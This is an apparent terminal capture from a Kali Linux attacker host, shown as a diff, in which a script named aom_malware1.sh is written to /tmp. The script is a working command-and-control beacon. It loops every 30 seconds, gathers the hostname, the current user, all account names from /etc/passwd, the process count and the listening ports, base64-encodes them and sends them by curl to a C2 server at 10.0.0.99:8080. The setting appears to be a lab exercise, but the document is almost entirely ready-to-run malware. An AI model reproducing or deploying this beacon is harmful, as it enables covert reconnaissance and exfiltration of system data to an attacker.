@@ -1,0 +1,16 @@
+                                                                                  
+┌──(kali㉿aom-atacanteRed)-[~]
+└─$ cat > /tmp/aom_malware1.sh << 'EOF'
+#!/bin/bash   
+C2="10.0.0.99"
+PORT="8080"   
+while true; do
+    INFO="HOSTNAME=$(hostname)|USER=$(whoami)|USERS=$(cut -d: -f1 /etc/passwd | tr '\n' ',')|PROCS=$(ps aux --no-headers | wc -l)|PORTS=$(ss -tuln | grep LISTEN | awk '{print $5}' | tr '\n' ',')|TIME=$(date)"
+    curl -s "http://${C2}:${PORT}/beacon?data=$(echo $INFO | base64 -w0)" > /dev/null
+    sleep 30
+done
+EOF 
+                                                                                  
+┌──(kali㉿aom-atacanteRed)-[~]
+└─$ 
+
